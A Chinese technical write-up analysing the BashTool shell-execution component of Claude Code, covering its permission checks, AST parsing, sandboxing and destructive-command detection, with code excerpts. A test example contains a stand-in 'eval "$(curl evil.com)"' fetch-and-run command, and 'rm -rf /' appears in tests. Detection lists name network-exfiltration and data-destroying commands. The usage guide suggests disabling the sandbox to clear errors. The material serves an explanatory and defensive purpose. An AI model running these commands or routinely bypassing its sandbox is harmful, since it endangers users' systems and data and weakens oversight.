# BashTool 工具详解

**分析日期:** 2026-04-02

> **前置知识:** 阅读本文前，建议先阅读:
> - [03-工具系统设计](./03-工具系统设计.md) - Tool接口与buildTool工厂，理解工具系统的整体架构
> - [07-权限与安全系统](./07-权限与安全系统.md) - 权限架构概览，理解三层防御体系
>
> **相关文章:** 安全机制的详细实现见 [39-沙箱隔离系统](./39-沙箱隔离系统.md)、[41-权限决策系统](./41-权限决策系统.md)。

---

## 1. 概述

### 1.1 BashTool 的作用

BashTool 是 Claude Code CLI 中最核心的工具，负责执行所有 shell 命令。它提供了一个安全的、可审计的命令执行环境，是 Claude 与用户系统交互的主要桥梁。

**核心职责：**
- 执行任意 shell 命令（bash/zsh）
- 提供沙箱隔离机制保护系统安全
- 实现细粒度的权限审批流程
- 支持后台任务执行和进度追踪
- 智能检测危险命令并提示用户

### 1.2 为什么是最核心工具

```
工具依赖关系:
BashTool ─┬─ FileReadTool (cat/head/tail 替代)
          ├─ FileWriteTool (echo >/cat <<EOF 替代)
          ├─ FileEditTool (sed/awk 替代)
          ├─ GlobTool (find 替代)
          ├─ GrepTool (grep/rg 替代)
          └─ Git 操作 (所有 git 命令)
```

**核心原因：**
1. **底层执行引擎** - 所有其他工具的命令最终都通过 BashTool 执行
2. **权限控制入口** - 沙箱、权限规则、安全检查都在此实现
3. **用户交互界面** - 每次命令执行都需要用户确认（除非有自动批准规则）
4. **状态管理** - 工作目录持久化、后台任务管理

---

## 2. 输入 Schema 详解

### 2.1 完整参数定义

**文件位置：** `tools/BashTool/BashTool.tsx` (行 227-247)

```typescript
const fullInputSchema = lazySchema(() => z.strictObject({
  command: z.string().describe('The command to execute'),
  timeout: semanticNumber(z.number().optional())
    .describe(`Optional timeout in milliseconds (max ${getMaxTimeoutMs()})`),
  description: z.string().optional()
    .describe(`Clear, concise description of what this command does...`),
  run_in_background: semanticBoolean(z.boolean().optional())
    .describe(`Set to true to run this command in the background...`),
  dangerouslyDisableSandbox: semanticBoolean(z.boolean().optional())
    .describe('Set this to true to dangerously override sandbox mode...'),
  _simulatedSedEdit: z.object({
    filePath: z.string(),
    newContent: z.string()
  }).optional() // 内部使用，不暴露给模型
}));
```

### 2.2 command 参数

**必填参数** - 要执行的 shell 命令字符串。

**特性：**
- 支持多行命令（换行符分隔）
- 支持 heredoc 语法（`<<EOF ... EOF`）
- 支持管道和重定向（`|`, `>`, `>>`）
- 支持命令链（`&&`, `||`, `;`）

**示例：**
```bash
# 简单命令
command: "ls -la"

# 复合命令
command: "git status && git diff"

# Heredoc
command: "cat <<EOF\nHello World\nEOF"

# 管道
command: "find . -name '*.ts' | head -20"
```

### 2.3 timeout 参数

**可选参数** - 命令执行超时时间（毫秒）。

**文件位置：** `tools/BashTool/prompt.ts` (行 27-33)

```typescript
export function getDefaultTimeoutMs(): number {
  return getDefaultBashTimeoutMs()  // 默认 120000ms (2分钟)
}

export function getMaxTimeoutMs(): number {
  return getMaxBashTimeoutMs()  // 最大 600000ms (10分钟)
}
```

**超时行为：**
- 默认超时：2 分钟
- 最大超时：10 分钟
- 超时后命令被中断（SIGTERM）
- 后台任务不受超时限制

### 2.4 dangerouslyDisableSandbox 参数

**可选参数** - 禁用沙箱隔离。

**文件位置：** `tools/BashTool/shouldUseSandbox.ts` (行 130-153)

```typescript
export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
  if (!SandboxManager.isSandboxingEnabled()) {
    return false;
  }

  // 仅在明确禁用且策略允许时才禁用沙箱
  if (
    input.dangerouslyDisableSandbox &&
    SandboxManager.areUnsandboxedCommandsAllowed()
  ) {
    return false;
  }

  if (!input.command) {
    return false;
  }

  // 检查排除命令列表
  if (containsExcludedCommand(input.command)) {
    return false;
  }

  return true;
}
```

**安全策略：**
- 需要策略允许 `areUnsandboxedCommandsAllowed()`
- 会触发用户审批提示
- 不建议常规使用

### 2.5 run_in_background 参数

**可选参数** - 后台执行命令。

**文件位置：** `tools/BashTool/prompt.ts` (行 35-40)

```typescript
function getBackgroundUsageNote(): string | null {
  if (isEnvTruthy(process.env.CLAUDE_CODE_DISABLE_BACKGROUND_TASKS)) {
    return null;
  }
  return "You can use the `run_in_background` parameter to run the command in the background...";
}
```

**使用场景：**
- 长时间运行的构建命令
- 服务器启动
- 不需要立即结果的操作

### 2.6 description 参数

**可选参数** - 命令描述，用于 UI 显示。

**最佳实践：**
```typescript
// 简单命令 (5-10 个词)
description: "List files in current directory"
description: "Show working tree status"

// 复杂命令 (更多上下文)
description: "Find and delete all .tmp files recursively"
description: "Discard all local changes and match remote main"
```

---

## 3. 执行流程逐行分析

### 3.1 整体流程图

```
┌─────────────────────────────────────────────────────────────────┐
│                     BashTool 执行流程                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 输入验证 (validateInput)                                    │
│     └─ 检测阻塞 sleep 模式                                      │
│                                                                 │
│  2. 权限检查 (checkPermissions)                                 │
│     ├─ 沙箱决策 (shouldUseSandbox)                              │
│     ├─ 安全分析 (bashSecurity.ts)                               │
│     ├─ 只读检查 (readOnlyValidation.ts)                         │
│     ├─ 路径验证 (pathValidation.ts)                             │
│     ├─ sed 约束 (sedValidation.ts)                              │
│     └─ 模式检查 (modeValidation.ts)                             │
│                                                                 │
│  3. 用户审批 (如需要)                                           │
│     └─ 显示权限请求对话框                                       │
│                                                                 │
│  4. 命令执行 (spawnShellTask)                                   │
│     ├─ 沙箱隔离 (SandboxManager)                                │
│     ├─ 进程监控 (超时/中断)                                     │
│     └─ 输出收集                                                 │
│                                                                 │
│  5. 结果处理                                                    │
│     ├─ 输出格式化                                               │
│     ├─ 截断处理                                                 │
│     ├─ 图像检测                                                 │
│     └─ 工作目录重置                                             │
│                                                                 │
│  6. 返回结果                                                    │
│     └─ 构建工具结果对象                                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 命令解析阶段

**文件位置：** `utils/bash/ast.ts` (行 1-150)

BashTool 使用 tree-sitter 进行精确的 AST 解析：

```typescript
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

**解析策略：**
1. **白名单节点类型** - 只识别已知的 AST 节点
2. **失败即拒绝** - 无法解析的命令需要用户审批
3. **递归结构处理** - 处理管道、列表、重定向

```typescript
const STRUCTURAL_TYPES = new Set([
  'program',      // 根节点
  'list',         // a && b || c
  'pipeline',     // a | b
  'redirected_statement',  // cmd > file
]);

const SEPARATOR_TYPES = new Set(['&&', '||', '|', ';', '&', '|&', '\n']);
```

### 3.3 权限检查阶段

**文件位置：** `tools/BashTool/bashPermissions.ts` (行 1-300)

权限检查是多阶段的流水线：

```typescript
export async function bashToolHasPermission(
  input: z.infer<typeof BashTool.inputSchema>,
  context: ToolPermissionContext,
): Promise<PermissionResult> {
  // 1. 模式检查
  const modeResult = checkPermissionMode(input, context);
  
  // 2. sed 约束检查
  const sedResult = checkSedConstraints(input, context);
  
  // 3. 安全检查
  const securityResult = await bashCommandIsSafeAsync(input.command);
  
  // 4. 只读约束检查
  const readOnlyResult = checkReadOnlyConstraints(input, ...);
  
  // 5. 路径约束检查
  const pathResult = checkPathConstraints(input, context);
  
  // 6. 分类器检查 (如果启用)
  if (isClassifierPermissionsEnabled()) {
    const classifierResult = classifyBashCommand(input.command);
    // ...
  }
  
  // 综合决策
  return finalDecision;
}
```

### 3.4 沙箱隔离阶段

**文件位置：** `tools/BashTool/shouldUseSandbox.ts`

```typescript
function containsExcludedCommand(command: string): boolean {
  // 1. 检查动态配置的禁用命令
  const disabledCommands = getFeatureValue_CACHED_MAY_BE_STALE<...>(
    'tengu_sandbox_disabled_commands',
    { commands: [], substrings: [] }
  );

  // 2. 检查用户配置的排除命令
  const settings = getSettings_DEPRECATED();
  const userExcludedCommands = settings.sandbox?.excludedCommands ?? [];

  // 3. 分割复合命令并检查每个子命令
  const subcommands = splitCommand_DEPRECATED(command);
  for (const subcommand of subcommands) {
    // 匹配模式：精确、前缀、通配符
  }
}
```

### 3.5 执行监控阶段

**文件位置：** `tools/BashTool/BashTool.tsx` (行 300-420)

```typescript
// 后台任务检测
function isAutobackgroundingAllowed(command: string): boolean {
  const parts = splitCommand_DEPRECATED(command);
  const baseCommand = parts[0]?.trim();
  return !DISALLOWED_AUTO_BACKGROUND_COMMANDS.includes(baseCommand);
}

// Sleep 模式检测
export function detectBlockedSleepPattern(command: string): string | null {
  const m = /^sleep\s+(\d+)\s*$/.exec(first);
  if (!m) return null;
  const secs = parseInt(m[1]!, 10);
  if (secs < 2) return null; // 小于2秒的sleep允许
  // ...
}
```

### 3.6 结果返回阶段

**文件位置：** `tools/BashTool/BashTool.tsx` (行 555-600)

```typescript
mapToolResultToToolResultBlockParam({
  interrupted,
  stdout,
  stderr,
  isImage,
  backgroundTaskId,
  persistedOutputPath,
  persistedOutputSize,
}, toolUseID): ToolResultBlockParam {
  // 1. 结构化内容处理
  if (structuredContent && structuredContent.length > 0) {
    return { tool_use_id: toolUseID, type: 'tool_result', content: structuredContent };
  }

  // 2. 图像数据处理
  if (isImage) {
    const block = buildImageToolResult(stdout, toolUseID);
    if (block) return block;
  }

  // 3. 大输出持久化
  if (persistedOutputPath) {
    const preview = generatePreview(processedStdout, PREVIEW_SIZE_BYTES);
    processedStdout = buildLargeToolResultMessage({...});
  }

  return { tool_use_id: toolUseID, type: 'tool_result', content: processedStdout };
}
```

---

## 4. Bash AST 解析器

### 4.1 核心设计理念

**文件位置：** `utils/bash/ast.ts` (行 1-50)

```
┌─────────────────────────────────────────────────────────────────┐
│                    AST 解析器设计原则                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FAIL-CLOSED: 无法解析 = 需要用户审批                           │
│  ─────────────────────────────────────────────────────────────  │
│  我们不解释不理解的结构。如果 tree-sitter 产生未知的节点类型，   │
│  我们拒绝提取 argv，让调用者向用户请求许可。                     │
│                                                                 │
│  这不是沙箱，不阻止危险命令执行。它只回答一个问题：               │
│  "我们能为此字符串中的每个简单命令生成可信的 argv[] 吗？"        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 命令安全分析

**文件位置：** `tools/BashTool/bashSecurity.ts` (行 1-100)

```typescript
// 命令替换模式检测
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /~\[/, message: 'Zsh-style parameter expansion' },
  // ...
];

// Zsh 危险命令
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // 模块加载
  'emulate',    // eval 等价物
  'sysopen',    // 文件操作
  'syswrite',
  'zpty',       // 伪终端执行
  'ztcp',       // 网络外泄
  // ...
]);
```

### 4.3 危险模式检测

**文件位置：** `tools/BashTool/bashSecurity.ts` (行 233-287)

```typescript
function validateIncompleteCommands(
  context: ValidationContext,
): PermissionResult {
  // 以 Tab 开头 - 可能是命令片段
  if (/^\s*\t/.test(originalCommand)) {
    return { behavior: 'ask', message: 'Command appears to be an incomplete fragment' };
  }

  // 以 flags 开头 - 可能是不完整命令
  if (trimmed.startsWith('-')) {
    return { behavior: 'ask', message: 'Command appears to be an incomplete fragment' };
  }

  // 以操作符开头 - 可能是续行
  if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand)) {
    return { behavior: 'ask', message: 'Command appears to be a continuation line' };
  }

  return { behavior: 'passthrough', message: 'Command appears complete' };
}
```

### 4.4 环境变量安全处理

**文件位置：** `tools/BashTool/bashPermissions.ts` (行 378-497)

```typescript
// 安全的环境变量白名单
const SAFE_ENV_VARS = new Set([
  'GOEXPERIMENT', 'GOOS', 'GOARCH',      // Go 构建
  'RUST_BACKTRACE', 'RUST_LOG',          // Rust 调试
  'NODE_ENV',                            // Node 环境
  'PYTHONUNBUFFERED',                    // Python 行为
  'ANTHROPIC_API_KEY',                   // API 认证
  'LANG', 'LC_ALL', 'TZ',                // 语言/时区
  'TERM', 'NO_COLOR', 'FORCE_COLOR',    // 终端设置
  // ...
]);

// ANT-ONLY 安全变量 (仅内部用户)
const ANT_ONLY_SAFE_ENV_VARS = new Set([
  'KUBECONFIG',      // kubectl 配置
  'DOCKER_HOST',     // Docker 端点
  'AWS_PROFILE',     // AWS 配置
  'CUDA_VISIBLE_DEVICES',  // GPU 选择
  // ...
]);
```

---

## 5. 用户使用指南

### 5.1 如何安全执行命令

**基本原则：**

1. **使用专用工具优先**
   ```
   ✅ 推荐: Read tool 读取文件
   ❌ 避免: Bash(cat file.txt)
   
   ✅ 推荐: Glob tool 搜索文件
   ❌ 避免: Bash(find . -name "*.ts")
   
   ✅ 推荐: Grep tool 搜索内容
   ❌ 避免: Bash(grep -r "pattern" .)
   ```

2. **使用绝对路径**
   ```bash
   ✅ 推荐: ls /home/user/project
   ❌ 避免: cd /home/user/project && ls
   ```

3. **并行执行独立命令**
   ```typescript
   // 在一条消息中发送多个独立的 Bash 调用
   [
     { command: "git status" },
     { command: "git diff" },
     { command: "git log --oneline -5" }
   ]
   ```

4. **顺序执行依赖命令**
   ```bash
   # 使用 && 链接依赖命令
   cd project && npm install && npm test
   ```

### 5.2 超时处理

**设置超时：**
```typescript
{
  command: "npm run build",
  timeout: 300000  // 5分钟
}
```

**超时后处理：**
1. 命令被 SIGTERM 中断
2. 收到超时通知
3. 可以选择重新执行或后台运行

**避免超时：**
```typescript
{
  command: "npm run build",
  run_in_background: true  // 后台运行，无超时限制
}
```

### 5.3 沙箱绕过场景

**何时需要绕过沙箱：**

1. **访问受限路径**
   ```
   错误: "Operation not permitted" 访问 /etc/hosts
   解决: 使用 dangerouslyDisableSandbox: true
   ```

2. **网络限制**
   ```
   错误: 连接到非白名单主机失败
   解决: 调整沙箱设置或绕过沙箱
   ```

3. **Unix Socket 访问**
   ```
   错误: Docker socket 连接被拒绝
   解决: 配置 allowUnixSockets 或绕过沙箱
   ```

**安全使用：**
```typescript
// 仅在确认需要时绕过
{
  command: "docker ps",
  dangerouslyDisableSandbox: true  // 会触发用户审批
}
```

### 5.4 最佳实践

**命令描述：**
```typescript
// 简单命令 - 简洁描述
{
  command: "ls -la",
  description: "List files in current directory"
}

// 复杂命令 - 详细描述
{
  command: "find . -name '*.tmp' -exec rm {} \\;",
  description: "Find and delete all .tmp files recursively"
}
```

**Git 操作：**
```typescript
// 创建提交的正确方式
1. 并行运行: git status, git diff, git log
2. 分析变更，起草提交信息
3. 添加文件并提交
4. 运行 git status 验证

// 危险操作需要用户明确请求
❌ 不要自动运行: git reset --hard, git push --force
```

**后台任务：**
```typescript
{
  command: "npm run dev",
  run_in_background: true,
  description: "Start development server"
}
// 任务 ID 将返回，完成后收到通知
```

### 5.5 常见错误解决

**错误 1: 命令被拒绝**
```
Permission denied for: rm -rf /
原因: 危险命令需要用户审批
解决: 用户在对话框中批准，或添加权限规则
```

**错误 2: 沙箱违规**
```
<sandbox_violations>...</sandbox_violations>
原因: 命令访问了沙箱限制的路径/网络
解决: 
  1. 使用 dangerouslyDisableSandbox: true
  2. 或调整沙箱配置 (/sandbox 命令)
```

**错误 3: 超时**
```
Command timed out after 120000ms
原因: 命令执行时间超过默认超时
解决:
  1. 增加 timeout 参数
  2. 或使用 run_in_background: true
```

**错误 4: 输出截断**
```
... [500 lines truncated] ...
原因: 输出超过最大长度限制
解决: 
  1. 使用管道限制输出 (| head -100)
  2. 输出会保存到临时文件供完整查看
```

---

## 6. 安全机制

### 6.1 沙箱隔离原理

**文件位置：** `utils/sandbox/sandbox-adapter.js`

```
┌─────────────────────────────────────────────────────────────────┐
│                      沙箱架构                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────┐    ┌───────────────┐    ┌───────────────┐   │
│  │   BashTool    │───>│ SandboxManager │───>│  Sandbox      │   │
│  │   (调用方)    │    │   (决策层)     │    │  (执行层)     │   │
│  └───────────────┘    └───────────────┘    └───────────────┘   │
│                              │                                  │
│                              ▼                                  │
│                    ┌─────────────────┐                         │
│                    │   配置来源      │                         │
│                    ├─────────────────┤                         │
│                    │ • settings.json │                         │
│                    │ • CLI flags     │                         │
│                    │ • 默认值        │                         │
│                    └─────────────────┘                         │
│                                                                 │
│  限制类型:                                                      │
│  ─────────────────────────────────────────────────────────────  │
│  文件系统:                                                      │
│    • read.denyOnly: 禁止读取的路径                              │
│    • write.allowOnly: 允许写入的路径                            │
│                                                                 │
│  网络:                                                          │
│    • allowedHosts: 允许访问的主机                               │
│    • deniedHosts: 禁止访问的主机                                │
│                                                                 │
│  其他:                                                          │
│    • allowUnixSockets: 允许的 Unix Socket                       │
│    • ignoreViolations: 忽略的违规类型                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 危险命令检测

**文件位置：** `tools/BashTool/destructiveCommandWarning.ts`

```typescript
const DESTRUCTIVE_PATTERNS: DestructivePattern[] = [
  // Git 数据丢失
  { pattern: /\bgit\s+reset\s+--hard\b/,
    warning: 'Note: may discard uncommitted changes' },
  { pattern: /\bgit\s+push\b[^;&|\n]*[ \t](--force|--force-with-lease|-f)\b/,
    warning: 'Note: may overwrite remote history' },
  { pattern: /\bgit\s+clean\b[^;&|\n]*-[a-zA-Z]*f/,
    warning: 'Note: may permanently delete untracked files' },

  // 文件删除
  { pattern: /(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*[rR]/,
    warning: 'Note: may recursively remove files' },
  { pattern: /(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*f/,
    warning: 'Note: may force-remove files' },

  // 数据库操作
  { pattern: /\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b/i,
    warning: 'Note: may drop or truncate database objects' },

  // 基础设施
  { pattern: /\bkubectl\s+delete\b/,
    warning: 'Note: may delete Kubernetes resources' },
  { pattern: /\bterraform\s+destroy\b/,
    warning: 'Note: may destroy Terraform infrastructure' },
];
```

### 6.3 权限审批流程

**文件位置：** `tools/BashTool/bashPermissions.ts` (行 266-295)

```typescript
function suggestionForExactCommand(command: string): PermissionUpdate[] {
  // Heredoc 命令建议前缀规则
  const heredocPrefix = extractPrefixBeforeHeredoc(command);
  if (heredocPrefix) {
    return sharedSuggestionForPrefix(BashTool.name, heredocPrefix);
  }

  // 多行命令使用第一行作为前缀
  if (command.includes('\n')) {
    const firstLine = command.split('\n')[0]!.trim();
    return sharedSuggestionForPrefix(BashTool.name, firstLine);
  }

  // 单行命令提取两词前缀
  const prefix = getSimpleCommandPrefix(command);
  if (prefix) {
    return sharedSuggestionForPrefix(BashTool.name, prefix);
  }

  return sharedSuggestionForExactCommand(BashTool.name, command);
}
```

**权限规则类型：**
```typescript
type PermissionRule = 
  | { type: 'exact'; command: string }      // 精确匹配: "npm run lint"
  | { type: 'prefix'; prefix: string }      // 前缀匹配: "npm run:*"
  | { type: 'wildcard'; pattern: string }   // 通配符: "git *"
```

### 6.4 只读命令白名单

**文件位置：** `tools/BashTool/readOnlyValidation.ts` (行 50-200)

```typescript
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // Git 只读命令
  ...GIT_READ_ONLY_COMMANDS,
  
  // file 命令 - 文件类型检测
  file: {
    safeFlags: {
      '--brief': 'none', '-b': 'none',
      '--mime': 'none', '-i': 'none',
      '--mime-type': 'none', '--mime-encoding': 'none',
      // ...
    },
  },
  
  // fd 命令 - 文件搜索 (不含 -x/--exec)
  // SECURITY: -x/--exec 被排除，因为它们执行任意命令
};
```

---

## 7. 从零实现指南

### 7.1 核心文件清单

```
tools/BashTool/
├── BashTool.tsx           # 主工具定义 (入口点)
├── bashPermissions.ts     # 权限检查逻辑
├── bashSecurity.ts        # 安全验证
├── shouldUseSandbox.ts    # 沙箱决策
├── readOnlyValidation.ts  # 只读约束
├── pathValidation.ts      # 路径验证
├── sedValidation.ts       # sed 命令约束
├── modeValidation.ts      # 模式检查
├── commandSemantics.ts    # 退出码语义
├── destructiveCommandWarning.ts  # 危险命令警告
├── sedEditParser.ts       # sed 编辑解析
├── prompt.ts              # 工具提示词
├── UI.tsx                 # UI 渲染
├── BashToolResultMessage.tsx  # 结果显示
├── commentLabel.ts        # 注释标签提取
├── toolName.ts            # 工具名称常量
└── utils.ts               # 工具函数

utils/bash/
├── ast.ts                 # AST 解析 (tree-sitter)
├── parser.ts              # 原始解析器
├── ParsedCommand.ts       # 命令解析结果
├── commands.ts            # 命令分割
├── shellQuote.ts          # 引用解析
└── treeSitterAnalysis.ts  # tree-sitter 分析
```

### 7.2 实现步骤

**Step 1: 定义工具 Schema**
```typescript
// tools/BashTool/BashTool.tsx
const inputSchema = z.strictObject({
  command: z.string(),
  timeout: z.number().optional(),
  description: z.string().optional(),
  run_in_background: z.boolean().optional(),
  dangerouslyDisableSandbox: z.boolean().optional(),
});

const outputSchema = z.object({
  stdout: z.string(),
  stderr: z.string(),
  interrupted: z.boolean(),
  isImage: z.boolean().optional(),
  backgroundTaskId: z.string().optional(),
});
```

**Step 2: 实现权限检查**
```typescript
// tools/BashTool/bashPermissions.ts
export async function bashToolHasPermission(
  input: BashToolInput,
  context: ToolPermissionContext,
): Promise<PermissionResult> {
  // 1. 解析命令
  const parsed = await parseForSecurity(input.command);
  
  // 2. 检查安全约束
  const securityResult = await checkSecurityConstraints(input.command);
  if (securityResult.behavior === 'deny') return securityResult;
  
  // 3. 检查权限规则
  const ruleResult = checkAgainstPermissionRules(input.command, context);
  
  return ruleResult;
}
```

**Step 3: 实现安全验证**
```typescript
// tools/BashTool/bashSecurity.ts
export async function bashCommandIsSafeAsync_DEPRECATED(
  command: string,
): Promise<PermissionResult> {
  const validators = [
    validateEmpty,
    validateIncompleteCommands,
    validateJqCommands,
    validateDangerousPatterns,
    validateRedirections,
    // ...
  ];
  
  for (const validator of validators) {
    const result = validator(context);
    if (result.behavior !== 'passthrough') return result;
  }
  
  return { behavior: 'passthrough', message: 'Command passed all security checks' };
}
```

**Step 4: 实现命令执行**
```typescript
// tasks/LocalShellTask/LocalShellTask.tsx
export async function spawnShellTask(
  command: string,
  options: ShellTaskOptions,
): Promise<TaskResult> {
  // 1. 创建进程
  const proc = spawn(command, {
    shell: true,
    cwd: options.cwd,
    env: options.env,
    timeout: options.timeout,
  });
  
  // 2. 收集输出
  let stdout = '';
  let stderr = '';
  proc.stdout.on('data', (data) => { stdout += data; });
  proc.stderr.on('data', (data) => { stderr += data; });
  
  // 3. 等待完成
  return new Promise((resolve) => {
    proc.on('close', (code) => {
      resolve({ stdout, stderr, exitCode: code });
    });
  });
}
```

**Step 5: 实现 UI 渲染**
```typescript
// tools/BashTool/UI.tsx
export function renderToolUseMessage(
  input: Partial<BashToolInput>,
  options: { verbose: boolean },
): React.ReactNode {
  const { command } = input;
  
  // 解析 sed 编辑
  const sedInfo = parseSedEditCommand(command);
  if (sedInfo) {
    return sedInfo.filePath;  // 显示为文件编辑
  }
  
  // 截断长命令
  if (command.length > MAX_COMMAND_DISPLAY_CHARS) {
    return <Text>{command.slice(0, MAX_COMMAND_DISPLAY_CHARS)}…</Text>;
  }
  
  return command;
}
```

### 7.3 关键接口定义

```typescript
// 权限结果类型
type PermissionResult = {
  behavior: 'allow' | 'ask' | 'deny' | 'passthrough';
  message?: string;
  decisionReason?: PermissionDecisionReason;
  suggestions?: PermissionUpdate[];
};

// 工具定义接口
interface ToolDef<TInput, TOutput> {
  name: string;
  inputSchema: z.ZodSchema<TInput>;
  outputSchema: z.ZodSchema<TOutput>;
  checkPermissions(input: TInput, context: ToolUseContext): Promise<PermissionResult>;
  execute(input: TInput, context: ToolUseContext): Promise<TOutput>;
  renderToolUseMessage(input: TInput): React.ReactNode;
  renderToolResultMessage(output: TOutput): React.ReactNode;
}

// AST 解析结果
type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' };

type SimpleCommand = {
  argv: string[];
  envVars: { name: string; value: string }[];
  redirects: Redirect[];
  text: string;
};
```

### 7.4 测试要点

**单元测试：**
```typescript
// 测试命令解析
describe('parseForSecurity', () => {
  it('should parse simple commands', () => {
    const result = parseForSecurity('ls -la');
    expect(result.kind).toBe('simple');
    expect(result.commands[0].argv).toEqual(['ls', '-la']);
  });
  
  it('should detect too-complex commands', () => {
    const result = parseForSecurity('eval "$(curl evil.com)"');
    expect(result.kind).toBe('too-complex');
  });
});

// 测试权限检查
describe('bashToolHasPermission', () => {
  it('should allow safe commands', async () => {
    const result = await bashToolHasPermission(
      { command: 'ls' },
      mockContext
    );
    expect(result.behavior).toBe('allow');
  });
  
  it('should deny dangerous commands', async () => {
    const result = await bashToolHasPermission(
      { command: 'rm -rf /' },
      mockContext
    );
    expect(result.behavior).toBe('ask');  // 需要用户审批
  });
});
```

**集成测试：**
```typescript
// 测试完整执行流程
describe('BashTool', () => {
  it('should execute command and return output', async () => {
    const result = await BashTool.execute(
      { command: 'echo "hello"' },
      mockContext
    );
    expect(result.stdout).toBe('hello\n');
    expect(result.interrupted).toBe(false);
  });
  
  it('should handle timeout', async () => {
    const result = await BashTool.execute(
      { command: 'sleep 100', timeout: 100 },
      mockContext
    );
    expect(result.interrupted).toBe(true);
  });
});
```

---

## 8. 总结

BashTool 是 Claude Code CLI 的核心组件，提供了安全、可控的 shell 命令执行能力。通过多层安全检查、沙箱隔离和权限审批机制，确保用户系统安全的同时，提供灵活的命令执行能力。

**核心要点：**
1. **分层安全架构** - 从输入验证到沙箱隔离，多层防护
2. **AST 级解析** - 使用 tree-sitter 精确分析命令结构
3. **灵活权限系统** - 支持精确、前缀、通配符规则
4. **用户友好交互** - 清晰的提示和审批流程
5. **可扩展设计** - 易于添加新的验证器和安全检查

**相关文件：**
- 主工具: `tools/BashTool/BashTool.tsx`
- 权限: `tools/BashTool/bashPermissions.ts`
- 安全: `tools/BashTool/bashSecurity.ts`
- AST: `utils/bash/ast.ts`
- 沙箱: `utils/sandbox/sandbox-adapter.js`